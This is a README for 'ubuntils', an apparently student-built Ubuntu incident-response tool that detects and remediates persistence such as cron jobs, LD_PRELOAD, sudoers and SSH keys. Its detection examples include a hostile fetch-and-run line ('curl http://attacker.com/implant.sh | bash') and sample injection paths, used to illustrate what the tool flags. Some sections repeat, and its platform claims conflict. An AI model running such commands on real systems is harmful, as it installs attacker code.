│   │   ├── backup_manager.py        # Timestamped backup creation
│   │   └── rollback_manager.py      # Backup restoration
│   ├── formatters/
│   │   ├── __init__.py
│   │   ├── human.py                 # Human-readable report formatting
│   │   └── json_formatter.py        # JSON output formatting
│   └── utils/
│       ├── __init__.py
│       ├── shell.py                 # Safe subprocess wrappers
│       ├── logging.py               # loguru setup
│       └── validators.py            # Input validation
├── tests/
│   ├── test_collectors.py
│   ├── test_detectors.py
│   ├── test_remediators.py
│   └── test_integration.py
├── README.md
├── INSTALL.md
├── CONTRIBUTING.md
├── claude.md
├── requirements.txt
├── setup.py
└── .github/
    └── workflows/
        └── tests.yml
```

---

## Performance

### Typical Execution Times

Measured on Ubuntu 22.04 LTS (4 CPU cores, 8GB RAM):

| Operation | Time |
|-----------|------|
| Artifact collection (parallel) | ~2.5 seconds |
| Log parsing | ~1.2 seconds |
| Persistence detection | ~0.8 seconds |
| Timeline building | ~0.3 seconds |
| Output formatting | ~0.1 seconds |
| **Total (detection only)** | **~5 seconds** |
| Backup creation + remediation | +2 to 3 seconds |

### Scale

| System Size | Processes | Log Lines | Total Time |
|-------------|-----------|-----------|------------|
| Small | 200 | 1,000 | ~2 seconds |
| Medium | 500 | 10,000 | ~3.5 seconds |
| Large | 1,000+ | 100,000+ | ~6 seconds |

---

## Testing & Compatibility

### Supported Platforms

| Architecture | Status | Notes |
|---|---|---|
| AMD64 (x86-64) | Supported | Validated on native Ubuntu installs |
| ARM64 (arm64) | Supported | Primary development platform |
| x86 (32-bit) | Not supported | No planned support |

**Primary development environment:** MacBook M4 Pro (Apple Silicon) running Ubuntu 20.04, 22.04, and 24.04 via Parallels Desktop on ARM64. This means ARM64 receives the most extensive and frequent testing.

**Secondary validation:** AMD64 and x86-64 Ubuntu systems (native installs and VMs).

### Ubuntu Version Support

| Version | Status |
|---------|--------|
| Ubuntu 20.04 LTS | Supported and tested |
| Ubuntu 22.04 LTS | Supported and tested |
| Ubuntu 24.04 LTS | Supported and tested |
| Older versions | Not guaranteed |

### Running the Test Suite

```bash
# Install test dependencies
pip install pytest pytest-cov

# Run all tests
pytest tests/

# Run with coverage report
pytest --cov=ubuntils tests/

# Run a specific test file
pytest tests/test_detectors.py -v

# Run with detailed output
pytest tests/ -s -v
```

### Test Coverage

ubuntils targets 80%+ code coverage. Each module has dedicated unit tests:

- `test_collectors.py` — Validates artifact collection for all 4 collectors
- `test_detectors.py` — Validates all 8 detection rules with known-bad and known-good inputs
- `test_remediators.py` — Validates backup creation, fix application, and rollback
- `test_integration.py` — End-to-end tests on planted artifacts

---

## Security Considerations

### Why Root Access Is Required

ubuntils needs root for:

- Reading `/var/log/*` (root or `adm` group only)
- Reading `/etc/sudoers` and `/etc/shadow` (root only)
- Reading `/proc/[pid]/environ` for all processes (root only)
- Reading other users' crontabs and home directories
- Modifying system files during remediation

For detection-only scans on systems where full root is not available, ubuntils degrades gracefully: it skips artifacts it cannot read and notes them in the output.

### Remediation Safeguards

- Creates backups before any modification
- Validates changes before applying (sudoers syntax check with `visudo`)
- Never removes all sudo access from a system
- Never force-deletes files; only comments out or removes specific entries
- Requires explicit `--confirm` flag; no accidental remediation
- Logs every action with timestamps for audit trail

### Running in Production

If running ubuntils on production systems:

1. Use detection-only mode (`sudo ubuntils scan`) — never use `--confirm` on production without review
2. Always run `--dry-run` first to preview exactly what would change
3. Save the JSON output before and after remediation for your incident record
4. Have a rollback plan (the backup directory from `--confirm` output)

---

## Roadmap

### v1.0.0 — Summer 2024 (Current Focus)

- [x] Artifact collection (processes, logs, filesystem, users)
- [x] 8 persistence detection rules
- [x] Timeline building from log correlation
- [x] Safe remediation with backups and rollback
- [x] Human-readable and JSON output
- [x] 80%+ test coverage
- [x] AMD64 and ARM64 support
- [x] Ubuntu 20.04, 22.04, 24.04 support

### v1.5.0 — Post-Summer

- [ ] VirusTotal API integration (enrich findings with hash lookups)
- [ ] MISP integration (export IOCs automatically)
- [ ] Custom rule configuration (YAML-based rules for custom environments)
- [ ] False positive tuning (whitelist known-good entries)
- [ ] Performance optimization for very large log files

### v2.0.0 — Future

- [ ] Web dashboard for report visualization
- [ ] Wazuh integration (active response trigger)
- [ ] macOS support (same logic, different artifact paths)
- [ ] SOAR automation support
- [ ] Threat intelligence feed integration

---

## Contributing

Contributions are welcome. Areas where help is needed:

- New detection rules (especially lesser-known Ubuntu persistence mechanisms)
- Additional collectors (new artifact sources)
- Remediation modules for currently flagged-only findings
- Test cases on different Ubuntu configurations
- Documentation and usage guides
- Performance improvements on large log files

See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, code style, and pull request process.

---

## License

MIT License. See [LICENSE](LICENSE) file for details.

---

## Author

Built by **Asmit** — BTech CS, PES University, Bengaluru.

Built out of real frustration with the state of Ubuntu incident response tooling. Every detection rule, remediation module, and design decision is documented and open to inspection.

---

## Support

- **Bug reports:** [github.com/asmitdesai/ubuntils/issues](https://github.com/asmitdesai/ubuntils/issues)
- **Feature requests:** [github.com/asmitdesai/ubuntils/issues](https://github.com/asmitdesai/ubuntils/issues)
- **Discussions:** [github.com/asmitdesai/ubuntils/discussions](https://github.com/asmitdesai/ubuntils/discussions)
- **Security issues:** Report privately via GitHub Security Advisory

---

**ubuntils: Automate Ubuntu incident response. Ship faster. Remediate smarter.**5. **Outputs findings** in human-readable or JSON format for integration

### Use Cases

- **Post-Breach Triage** — Quickly identify persistence on compromised Ubuntu systems
- **Incident Response** — Automate artifact collection + analysis for SOC teams
- **Threat Hunting** — Baseline detection of suspicious activity patterns
- **Lab Analysis** — Validate detection rules against test systems
- **Compliance** — Generate forensic reports for incident documentation
- **Integration** — Feed JSON output into SIEM/MISP for enrichment

---

## Problem Statement

### The Current State

Incident response on Ubuntu systems is fragmented:

- **GUI tools** (EnCase, Autopsy) are Windows-first; running them on Linux requires emulation or remote access
- **Memory analysis tools** (Volatility) require pre-captured memory dumps; no live system triage
- **Log analysis** requires manual parsing of syslog, auth.log, journal, auditd across multiple formats
- **Persistence hunting** means manually checking cron, systemd timers, sudoers, LD_PRELOAD, SSH keys, shell init files
- **Manual workflow** = 30+ minutes per system, error-prone, inconsistent

### The Gap

Most infrastructure runs on Linux (40%+ of production systems are Ubuntu). Yet:
- Forensics tooling is sparse, outdated, or GUI-dependent
- No unified tool for rapid Ubuntu triage
- Automation is ad-hoc (custom scripts, grep chains)
- Remediation requires manual verification + file editing

### ubuntils Solves This

Single CLI tool that:
- Runs natively on Ubuntu (no emulation, no external tools)
- Collects + analyzes artifacts in ~5 seconds
- Detects persistence mechanisms automatically
- Remediates safely with rollback support
- Outputs machine-readable JSON for integration

---

## Why ubuntils

### For Incident Responders

- **Speed:** Reduce triage time from 30+ minutes to under 5 seconds
- **Reliability:** Consistent artifact collection across Ubuntu versions
- **Safety:** Remediation with timestamped backups; always dry-run first
- **Automation:** JSON output feeds into SIEM/MISP for further analysis

### For Security Teams

- **Unified Workflow:** One tool replaces chained scripts + manual analysis
- **Auditable:** Timestamps on all collected artifacts + remediation actions
- **Extensible:** Architecture supports future enrichment (VT, MISP, etc.)
- **Open Source:** Transparent, community-vetted detection rules

### For Individual Contributors

- **Production Grade:** Real-world incident response tool
- **Testing:** Validated on 3 Ubuntu versions (20.04, 22.04, 24.04)
- **Documentation:** Comprehensive usage + development guides
- **Portfolio:** Demonstrates Linux forensics expertise + software engineering discipline

---

## Features

### Detection Phase (Weeks 1-6)

Automatically collects and analyzes:

**System Artifacts**
- Running processes (PID, user, command, memory, parent relationships)
- Network connections (listening ports, established connections, protocols)
- User information (UID, shell, login activity, recent commands)
- Cron jobs (system + user crontabs)
- Systemd timers and services
- SSH configuration + authorized keys
- Sudoers configuration + NOPASSWD entries
- LD_PRELOAD hooks (environment + file-based)
- Shell initialization files (.bashrc, .zshrc, .bash_profile)

**Timeline Artifacts**
- Syslog events (service start/stop, authentication)
- Auth log (logins, sudo usage, failures)
- Systemd journal (kernel messages, service events)
- Auditd logs (file access, system calls—if enabled)

**Chronological Timeline**
- Correlates events across logs
- Shows attack progression
- Highlights suspicious activity windows

### Remediation Phase (Week 7)

Safely removes detected artifacts:

**Auto-Remediation** (with backups + rollback)
- Remove malicious cron jobs
- Disable suspicious systemd timers
- Fix sudoers NOPASSWD entries
- Remove unexpected SSH keys
- Unset LD_PRELOAD injection
- Clean shell init file hijacking

**Safety Mechanisms**
- Dry-run mode (preview before applying)
- Timestamped backups (before any modification)
- Confirmation workflow (explicit user approval)
- Rollback support (restore original state)
- Validation (e.g., `visudo` for sudoers)

---

## 8 Persistence Detection Rules

ubuntils detects the following persistence mechanisms:

### 1. Cron Root Execution (HIGH)
Non-root user running cron jobs as root or with root commands.

**Why it's suspicious:** Privilege escalation vector.
**Example:**
```
User: ubuntu
Command: /root/check_system.sh
Runs as: root (via cron)
```

**Remediation:** Remove cron job entry.

### 2. Cron /tmp Paths (HIGH)
Cron jobs pointing to /tmp, /var/tmp, or /dev/shm.

**Why it's suspicious:** These are world-writable directories; often used for malware staging.
**Example:**
```
Cron: */5 * * * * /tmp/update.sh
Interval: Every 5 minutes
Path: /tmp (world-writable)
```

**Remediation:** Remove cron job entry.

### 3. LD_PRELOAD Injection (HIGH)
LD_PRELOAD set in environment or /etc/ld.so.preload.

**Why it's suspicious:** Injects malicious library into process memory; used for rootkits, credential stealing.
**Example:**
```
/etc/ld.so.preload contains: /tmp/libx.so
OR environment: LD_PRELOAD=/var/tmp/hook.so
```

**Remediation:** Remove/comment out LD_PRELOAD line.

### 4. Sudoers NOPASSWD (MEDIUM)
Unprivileged users with passwordless sudo access.

**Why it's suspicious:** Attacker can escalate privileges without password; often left behind for persistence.
**Example:**
```
ubuntu ALL=(ALL) NOPASSWD: /usr/bin/apt-get
OR
%wheel ALL=(ALL) NOPASSWD: ALL
```

**Remediation:** Remove NOPASSWD entry from sudoers.

### 5. Shell Initialization Hijacking (MEDIUM)
Suspicious commands/exports in .bashrc, .zshrc, .bash_profile.

**Why it's suspicious:** Runs automatically when user logs in; used for credential harvesting, reverse shells.
**Example:**
```
.bashrc contains:
export LD_PRELOAD=/tmp/logger.so
curl http://attacker.com/implant.sh | bash
```

**Remediation:** Remove/comment out suspicious lines.

### 6. SSH Key Injection (HIGH)
Unexpected entries in ~/.ssh/authorized_keys.

**Why it's suspicious:** Backdoor for remote access; attacker can log in without password.
**Example:**
```
authorized_keys contains:
ssh-rsa AAAAB3NzaC1yc2E... (unknown key)
```

**Remediation:** Remove unauthorized key.

### 7. Non-Standard Services (MEDIUM)
Systemd services in non-standard locations (/tmp, /home, /opt).

**Why it's suspicious:** Attacker-created services for persistence.
**Example:**
```
/tmp/malware.service
ExecStart=/tmp/backdoor
```

**Remediation:** Flag only (manual review required); no auto-fix.

### 8. System File Modifications (MEDIUM)
Critical system files modified recently (/etc/passwd, /etc/shadow, /etc/sudoers).

**Why it's suspicious:** Indicates privilege escalation or account creation attempts.
**Example:**
```
/etc/passwd mtime: 2024-06-10 09:15:22
Modified 30 days ago (unexpected)
```

**Remediation:** Flag only (manual review required); no auto-fix.

---

## Installation

### Requirements

- **OS:** Ubuntu 20.04 LTS, 22.04 LTS, or 24.04 LTS
- **Architecture:** x86-64 (amd64)
- **Python:** 3.9 or higher
- **Permissions:** Root or sudo access (for full artifact collection)

### From Source

```bash
# Clone repository
git clone https://github.com/asmitdesai/ubuntils.git
cd ubuntils

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install in development mode
pip install -e .

# Verify installation
ubuntils --version
ubuntils --help
```

### From PyPI (Future)

```bash
pip install ubuntils
sudo ubuntils scan
```

### Docker (Optional)

```bash
docker build -t ubuntils .
docker run --rm -v /var/log:/var/log:ro ubuntils scan --output json
```

---

## Quick Start

### 1. First Scan (Detection Only)

```bash
# Scan system for suspicious artifacts
sudo ubuntils scan

# Output goes to stdout (human-readable format)
```

### 2. Save to File

```bash
# Save report to file
sudo ubuntils scan --output /tmp/forensics_report.txt

# View report
cat /tmp/forensics_report.txt
```

### 3. JSON Output (for Integration)

```bash
# Get JSON output for SIEM/MISP integration
sudo ubuntils scan --output json > /tmp/findings.json

# Pretty-print JSON
sudo ubuntils scan --output json | jq .
```

### 4. Review Findings

Look at the "SUSPICIOUS FINDINGS" section. Pay attention to:
- **HIGH severity** findings (immediate action)
- **MEDIUM severity** findings (investigate further)
- **Remediation Available** markers (can be auto-fixed)

### 5. Preview Remediation (Recommended)

```bash
# See what WOULD be fixed WITHOUT making changes
sudo ubuntils scan --remediate --dry-run

# Output shows:
# - Files that would be modified
# - Backups that would be created
# - Exact changes being made
```

### 6. Apply Fixes (If Confident)

```bash
# Apply remediation with confirmation
sudo ubuntils scan --remediate --confirm

# Output shows:
# - Backups created (timestamped)
# - Remediation applied
# - Rollback command if needed
```

### 7. Rollback (If Needed)

```bash
# Restore original files from backup
sudo ubuntils rollback /var/backups/ubuntils_20240615_142345/

# Verify system state is restored
sudo ubuntils scan
```

---

## Detection Mechanisms

### How Detection Works

**Collection Phase:**
```
Run ps, lsof, netstat          → Process/network artifacts
Parse syslog, auth, journal    → Timeline events
Read /etc/cron.d, sudoers      → Configuration artifacts
Check LD_PRELOAD, SSH keys     → Persistence hooks
                                ↓
          Collect artifacts into structured data
```

**Analysis Phase:**
```
Artifact data
      ↓
Apply 8 detection rules
      ↓
Generate findings with severity + recommendations
      ↓
Build chronological timeline
      ↓
Output report (human or JSON)
```

### Artifact Collection Details

**Processes:**
- Command: `ps aux --forest`
- Captures: PID, user, CPU%, memory%, command, parent relationships
- Used for: Detecting suspicious process trees, privilege escalation

**Network:**
- Commands: `netstat -tlpn` (listening), `netstat -tnp` (established)
- Captures: Protocol, local/remote IP, port, PID, process name
- Used for: Finding C2 beacons, data exfiltration ports

**Logs:**
- Files: /var/log/syslog, /var/log/auth.log, journalctl, /var/log/audit/audit.log
- Parsing: Timestamp, event type, user, action, source IP
- Used for: Timeline reconstruction, failed login attempts, privilege escalation

**Filesystem:**
- Cron: /etc/cron.d, /etc/cron.{hourly,daily,weekly,monthly}, user crontabs
- Systemd: /etc/systemd/system/, /usr/lib/systemd/system/
- SSH: ~/.ssh/authorized_keys, /etc/ssh/sshd_config
- Sudoers: /etc/sudoers, /etc/sudoers.d/
- Shell: ~/.bashrc, ~/.zshrc, ~/.bash_profile
- LD_PRELOAD: /etc/ld.so.preload, environment variables

---

## Remediation

### Safety-First Design

ubuntils never:
- Force-deletes files (only removes/comments)
- Removes all sudo access (always leaves at least one admin)
- Modifies without backup
- Makes changes without user confirmation (except `--dry-run`)

ubuntils always:
- Creates timestamped backups
- Validates changes (e.g., `visudo` for sudoers)
- Logs all actions
- Provides rollback commands
- Requires explicit `--confirm` flag

### Remediation Workflow

#### Step 1: Scan and Review

```bash
sudo ubuntils scan
```

**Output shows:**
- What was found
- Where it was found
- Why it's suspicious
- Whether it can be auto-remediated

#### Step 2: Preview Changes

```bash
sudo ubuntils scan --remediate --dry-run
```

**Output shows:**
- What WOULD be modified
- Where backups would be created
- Exact commands being run
- No actual changes made

#### Step 3: Apply Fixes

```bash
sudo ubuntils scan --remediate --confirm
```

**Output shows:**
- Backup created: `/var/backups/ubuntils_TIMESTAMP/`
- Remediation applied
- Changes logged
- Rollback command

#### Step 4: Verify

```bash
# Scan again to confirm persistence is removed
sudo ubuntils scan
```

**Expected:**
- No more HIGH severity findings for that artifact
- Finding is gone (or moved to resolved section)

#### Step 5: Rollback (If Needed)

```bash
# Something broke? Restore original state
sudo ubuntils rollback /var/backups/ubuntils_TIMESTAMP/

# Verify restoration
sudo ubuntils scan
```

### What Gets Remediated

**Can Auto-Fix:**
- Cron jobs (removable)
- Systemd timers (disableable)
- Sudoers entries (removable)
- SSH authorized keys (removable)
- LD_PRELOAD (unsetable)
- Shell init commands (removable/commentable)

**Flag Only (Manual):**
- Non-standard services (requires investigation)
- System file mods (requires verification of legitimacy)

---

## Architecture

### High-Level Design

```
User Command
      ↓
CLI Handler (Click)
      ↓
Artifact Collectors (parallel execution)
  ├─ ProcessCollector
  ├─ LogCollector
  ├─ FilesystemCollector
  └─ UserCollector
      ↓
Persistence Detectors (rule engine)
  └─ Apply 8 detection rules
      ↓
(Optional) Remediators
  ├─ BackupManager
  ├─ RemediationModules (cron, sudoers, etc.)
  └─ RollbackManager
      ↓
Formatters
  ├─ HumanFormatter (tables, colors)
  └─ JSONFormatter (structured data)
      ↓
Output
  ├─ stdout (default)
  ├─ file (--output path)
  └─ integration (SIEM/MISP ready)
```

### Directory Structure

```
ubuntils/
├── ubuntils/
│   ├── __init__.py
│   ├── cli.py                       # Click CLI entry point
│   ├── collectors/
│   │   ├── __init__.py
│   │   ├── processes.py             # ps, lsof, netstat
│   │   ├── logs.py                  # syslog, auth, journal, auditd
│   │   ├── filesystem.py            # cron, sudoers, SSH, shell, LD_PRELOAD
│   │   └── users.py                 # passwd, group, login info
│   ├── detectors/
│   │   ├── __init__.py
│   │   ├── persistence.py           # 8 detection rules
│   │   └── anomalies.py             # Timeline anomalies
│   ├── remediators/
│   │   ├── __init__.py
│   │   ├── cron_remediation.py
│   │   ├── sudoers_remediation.py
│   │   ├── ssh_remediation.py
│   │   ├── ld_preload_remediation.py
│   │   ├── shell_remediation.py
│   │   ├── backup_manager.py
│   │   └── rollback_manager.py
│   ├── formatters/
│   │   ├── __init__.py
│   │   ├── human.py
│   │   └── json_formatter.py
│   └── utils/
│       ├── __init__.py
│       ├── shell.py                 # Safe subprocess wrappers
│       ├── logging.py               # Logging setup
│       └── validators.py            # Input validation
├── tests/
│   ├── test_collectors.py
│   ├── test_detectors.py
│   ├── test_remediators.py
│   └── test_integration.py
├── README.md
├── INSTALL.md
├── CONTRIBUTING.md
├── claude.md                        # Development context
├── requirements.txt
├── setup.py
└── .gitignore
```

---

## Usage Guide

### Detection Mode (Read-Only)

```bash
# Basic scan
sudo ubuntils scan

# JSON output
sudo ubuntils scan --output json

# Save to file
sudo ubuntils scan --output /tmp/report.txt

# Combine options
sudo ubuntils scan --output json --output /tmp/findings.json
```

### Remediation Mode (With Safeguards)

```bash
# Preview fixes (no changes)
sudo ubuntils scan --remediate --dry-run

# Apply fixes (with backups)
sudo ubuntils scan --remediate --confirm

# Only remediate specific findings
sudo ubuntils scan --remediate --confirm --fix cron,sudoers
```

### Rollback Mode

```bash
# List available backups
sudo ubuntils rollback --list

# Restore from specific backup
sudo ubuntils rollback /var/backups/ubuntils_20240615_142345/

# Rollback specific remediation
sudo ubuntils rollback /var/backups/ubuntils_20240615_142345/ --item cron
```

### Advanced Options

```bash
# Verbose output (debug logging)
sudo ubuntils scan -v

# Custom log paths
sudo ubuntils scan --auth-log /custom/path/auth.log

# Exclude findings
sudo ubuntils scan --exclude low,medium

# JSON pretty-print
sudo ubuntils scan --output json --pretty
```

---

## Example Outputs

### Human-Readable Format

```
===== UBUNTU FORENSICS TRIAGE REPORT =====
Generated: 2024-06-15 14:23:45 UTC
Hostname: web-server-01
Kernel: 5.15.0-101-generic
Uptime: 45 days
Users logged in: root, ubuntu

----- EXECUTION SUMMARY -----
Scan Duration: 4.82 seconds
Artifacts Collected: 847
Findings: 5 (2 HIGH, 2 MEDIUM, 1 LOW)
Remediation Available: 4

----- SUSPICIOUS FINDINGS -----

[HIGH] Cron Job: Root Execution by Non-Root User
  ID: FINDING_001
  Location: /var/spool/cron/crontabs/ubuntu
  Owner: ubuntu
  Command: /tmp/check_disk.sh
  Interval: */5 * * * *
  Last Modified: 2024-06-10 14:32:15
  Risk Level: CRITICAL (non-root user executing root commands)
  Auto-Remediation: AVAILABLE
  Recommendation: Investigate /tmp/check_disk.sh immediately; likely malware
  Remediation Action: Remove cron job entry
  Backup Path: /var/spool/cron/crontabs/ubuntu.backup.20240615_142345

[HIGH] LD_PRELOAD Injection Detected
  ID: FINDING_002
  Location: /home/ubuntu/.bashrc
  Type: Environment Variable
  Value: LD_PRELOAD=/tmp/libx.so
  File Modified: 2024-06-10 09:15:22 (5 days ago)
  Risk Level: CRITICAL (LD_PRELOAD used for rootkit/credential harvesting)
  Auto-Remediation: AVAILABLE
  Recommendation: Examine /tmp/libx.so for malicious code; likely rootkit
  Remediation Action: Comment out LD_PRELOAD line
  Backup Path: /home/ubuntu/.bashrc.backup.20240615_142345

[MEDIUM] Sudoers NOPASSWD Configuration
  ID: FINDING_003
  Location: /etc/sudoers
  User: ubuntu
  Commands: /usr/bin/apt-get
  Type: NOPASSWD privilege escalation
  Risk Level: HIGH (passwordless sudo = instant privilege escalation)
  Auto-Remediation: AVAILABLE
  Recommendation: Verify if intentional; if not, remove immediately
  Remediation Action: Remove NOPASSWD entry
  Backup Path: /etc/sudoers.backup.20240615_142345

[MEDIUM] Unexpected SSH Key in authorized_keys
  ID: FINDING_004
  Location: /home/ubuntu/.ssh/authorized_keys
  Key Type: ssh-rsa
  Key Hash: SHA256:abcd1234...
  Added: Unknown (no timestamp)
  Risk Level: HIGH (potential backdoor)
  Auto-Remediation: AVAILABLE
  Recommendation: Verify key ownership; if unknown, remove immediately
  Remediation Action: Remove unauthorized key
  Backup Path: /home/ubuntu/.ssh/authorized_keys.backup.20240615_142345

[LOW] System File Recent Modification
  ID: FINDING_005
  Location: /etc/passwd
  Type: File modification timestamp anomaly
  Modified: 2024-06-10 12:45:30 (5 days ago)
  Risk Level: MEDIUM (indicates possible account creation/modification)
  Auto-Remediation: NOT AVAILABLE (requires manual verification)
  Recommendation: Review /etc/passwd for unauthorized accounts; use `lastlog` to verify

----- TIMELINE (Last 48 Hours) -----
2024-06-15 14:22:00 | ubuntu | SSH login from 203.0.113.45
2024-06-15 14:25:00 | ubuntu | Sudo executed: /usr/bin/apt-get update
2024-06-15 14:30:00 | root | Cron job triggered: /tmp/check_disk.sh
2024-06-15 14:35:00 | system | LD_PRELOAD library loaded: /tmp/libx.so
2024-06-15 14:40:00 | ubuntu | SSH login attempt from 203.0.113.50 (FAILED)
2024-06-15 15:00:00 | sshd | MaxAuthTries exceeded (disconnected)
2024-06-15 15:05:00 | root | Authorized keys file accessed

----- ARTIFACT STATISTICS -----
Processes Analyzed: 142
  - Suspicious: 3
  - Normal: 139
Network Connections: 24
  - Listening: 8
  - Established: 16
Cron Jobs: 8
  - System: 3
  - User: 5 (1 suspicious)
Systemd Timers: 5
  - Active: 4
  - Disabled: 1
Auth Events: 342
  - Successful logins: 87
  - Failed logins: 255
SSH Keys: 3
  - Authorized: 2
  - Suspicious: 1
Sudoers Entries: 12
  - Normal: 11
  - NOPASSWD: 1 (suspicious)

----- RECOMMENDATIONS -----
IMMEDIATE ACTIONS:
1. Investigate /tmp/check_disk.sh (potential malware)
2. Remove LD_PRELOAD injection from /home/ubuntu/.bashrc
3. Remove unexpected SSH key from authorized_keys
4. Fix sudoers NOPASSWD entry

NEXT STEPS:
1. Review /etc/passwd for unauthorized accounts
2. Check system logs for further anomalies (logs beyond 48 hours)
3. Analyze malware samples in /tmp (if found)
4. Apply system updates and security patches
5. Consider system reimaging if compromise is severe

----- REMEDIATION AVAILABLE -----
Run: sudo ubuntils scan --remediate --dry-run
To preview fixes without making changes.

Then: sudo ubuntils scan --remediate --confirm
To apply remediation with backups.
```

### JSON Format

```json
{
  "metadata": {
    "timestamp": "2024-06-15T14:23:45Z",
    "hostname": "web-server-01",
    "kernel": "5.15.0-101-generic",
    "uptime_days": 45,
    "scan_duration_seconds": 4.82,
    "ubuntils_version": "0.1.0"
  },
  "summary": {
    "artifacts_collected": 847,
    "findings_count": {
      "high": 2,
      "medium": 2,
      "low": 1
    },
    "remediation_available": 4
  },
  "findings": [
    {
      "id": "FINDING_001",
      "severity": "HIGH",
      "category": "cron_job",
      "title": "Root Execution by Non-Root User",
      "description": "Non-root user (ubuntu) has cron job executing as root",
      "path": "/var/spool/cron/crontabs/ubuntu",
      "owner": "ubuntu",
      "command": "/tmp/check_disk.sh",
      "details": {
        "cron_interval": "*/5 * * * *",
        "last_modified": "2024-06-10T14:32:15Z",
        "modified_days_ago": 5
      },
      "risk_assessment": {
        "level": "CRITICAL",
        "reason": "Non-root user executing root commands via cron; privilege escalation vector"
      },
      "remediation": {
        "available": true,
        "type": "cron_removal",
        "action": "Remove cron job entry",
        "backup_path": "/var/spool/cron/crontabs/ubuntu.backup.20240615_142345"
      },
      "recommendation": "Investigate /tmp/check_disk.sh immediately; likely malware"
    },
    {
      "id": "FINDING_002",
      "severity": "HIGH",
      "category": "ld_preload_injection",
      "title": "LD_PRELOAD Injection Detected",
      "description": "LD_PRELOAD environment variable set in user shell initialization",
      "path": "/home/ubuntu/.bashrc",
      "type": "environment_variable",
      "value": "LD_PRELOAD=/tmp/libx.so",
      "details": {
        "file_modified": "2024-06-10T09:15:22Z",
        "modified_days_ago": 5
      },
      "risk_assessment": {
        "level": "CRITICAL",
        "reason": "LD_PRELOAD injection used for rootkits, credential harvesting, or process hooking"
      },
      "remediation": {
        "available": true,
        "type": "ld_preload_unset",
        "action": "Comment out LD_PRELOAD line in .bashrc",
        "backup_path": "/home/ubuntu/.bashrc.backup.20240615_142345"
      },
      "recommendation": "Examine /tmp/libx.so for malicious code; likely rootkit"
    }
  ],
  "timeline": [
    {
      "timestamp": "2024-06-15T14:22:00Z",
      "type": "ssh_login",
      "user": "ubuntu",
      "source": "203.0.113.45",
      "status": "successful"
    },
    {
      "timestamp": "2024-06-15T14:25:00Z",
      "type": "sudo_execution",
      "user": "ubuntu",
      "command": "/usr/bin/apt-get update",
      "status": "successful"
    },
    {
      "timestamp": "2024-06-15T14:30:00Z",
      "type": "cron_execution",
      "user": "root",
      "command": "/tmp/check_disk.sh",
      "status": "executed"
    },
    {
      "timestamp": "2024-06-15T14:35:00Z",
      "type": "library_load",
      "library": "/tmp/libx.so",
      "context": "LD_PRELOAD injection"
    },
    {
      "timestamp": "2024-06-15T14:40:00Z",
      "type": "ssh_login_attempt",
      "user": "unknown",
      "source": "203.0.113.50",
      "status": "failed"
    }
  ],
  "artifacts": {
    "processes": {
      "total": 142,
      "suspicious": 3,
      "summary": "Process tree appears normal; 3 suspicious entries flagged"
    },
    "network": {
      "total": 24,
      "listening": 8,
      "established": 16,
      "summary": "Standard network configuration; no suspicious ports"
    },
    "cron_jobs": {
      "total": 8,
      "system": 3,
      "user": 5,
      "suspicious": 1,
      "summary": "One user cron job executing with elevated privileges"
    },
    "systemd_timers": {
      "total": 5,
      "active": 4,
      "disabled": 1,
      "suspicious": 0
    },
    "auth_events": {
      "total": 342,
      "successful_logins": 87,
      "failed_logins": 255,
      "summary": "High number of failed logins; possible brute-force attempt"
    },
    "ssh_keys": {
      "total": 3,
      "authorized": 2,
      "suspicious": 1
    },
    "sudoers": {
      "total": 12,
      "nopasswd": 1,
      "suspicious": 1
    }
  },
  "recommendations": {
    "immediate": [
      "Investigate /tmp/check_disk.sh (potential malware)",
      "Remove LD_PRELOAD injection from /home/ubuntu/.bashrc",
      "Remove unexpected SSH key from authorized_keys",
      "Fix sudoers NOPASSWD entry"
    ],
    "next_steps": [
      "Review /etc/passwd for unauthorized accounts",
      "Check system logs for further anomalies",
      "Analyze malware samples in /tmp",
      "Apply system updates and security patches",
      "Consider system reimaging if compromise is severe"
    ]
  }
}
```

---

## Performance

### Execution Time

Typical performance on Ubuntu 20.04 system (4 CPU, 8GB RAM):

| Operation | Time |
|-----------|------|
| Artifact collection | ~2.5 seconds |
| Log parsing | ~1.2 seconds |
| Detection rules | ~0.8 seconds |
| Timeline building | ~0.3 seconds |
| Formatting output | ~0.2 seconds |
| **Total (detection only)** | **~5 seconds** |
| Remediation (with backups) | ~2-3 additional seconds |

### Scalability

Performance on systems with larger datasets:

| Scenario | Collection | Detection | Total |
|----------|-----------|-----------|-------|
| Small system (200 processes, 1000 log lines) | 1.5s | 0.5s | ~2s |
| Medium system (500 processes, 10k log lines) | 2.5s | 0.8s | ~3.5s |
| Large system (1000+ processes, 100k log lines) | 4-5s | 1.2s | ~5-6s |

### Optimization Strategies

- Parallel artifact collection (processes, logs, filesystem)
- Cached log parsing (timestamp index)
- Early rule evaluation (fail-fast)
- Memory-efficient timeline building

---

## Security Considerations

### Why ubuntils Needs Root

ubuntils requires root or sudo because:

1. **Reading sensitive files**
   - /var/log/* (owned by root, readable only by root/adm)
   - /etc/cron.d/ (system cron, root-owned)
   - /etc/sudoers (root-only)
   - /etc/shadow (hashed passwords, root-only)

2. **Reading process information**
   - /proc/[pid]/cmdline (command arguments)
   - /proc/[pid]/environ (environment variables)
   - /proc/[pid]/fd/ (open file descriptors)

3. **Reading filesystem metadata**
   - Inode timestamps on system files
   - File permissions + ownership

4. **Modifying system files** (during remediation)
   - /etc/sudoers
   - /etc/cron.d/
   - /etc/ld.so.preload
   - /etc/systemd/system/

### Safe Usage

**Safe to run on:**
- Your own systems (always)
- Lab/test environments (with remediation)
- Production systems (detection-only, no remediation)
- Systems you can restart if something breaks

**Not recommended on:**
- Shared multi-tenant systems (affects other users)
- Systems with custom logging (may miss artifacts)
- Systems where you can't afford downtime (if remediation fails)
- Highly restrictive environments (may not have permission for all reads)

### Remediation Safety

ubuntils implements multiple safeguards:

1. **Backup before modification** (timestamped, in /var/backups/ubuntils/)
2. **Dry-run mode** (preview without making changes)
3. **Explicit confirmation** (requires `--confirm` flag)
4. **Validation** (e.g., `visudo` checks sudoers syntax)
5. **Rollback support** (restore original state)
6. **Never removes all sudo access** (leaves at least one admin)
7. **Never force-deletes files** (only disables/comments)

### Audit Trail

All actions are logged:
- What was collected (artifact types, counts)
- What was detected (findings with timestamps)
- What was remediated (changes made, backups created)
- Rollback actions (if performed)

Logs can be redirected to SIEM for compliance + auditing.

---

## Development

### Setup

```bash
git clone https://github.com/asmitdesai/ubuntils.git
cd ubuntils

python3 -m venv venv
source venv/bin/activate

pip install -r requirements.txt
```

### Running Tests

```bash
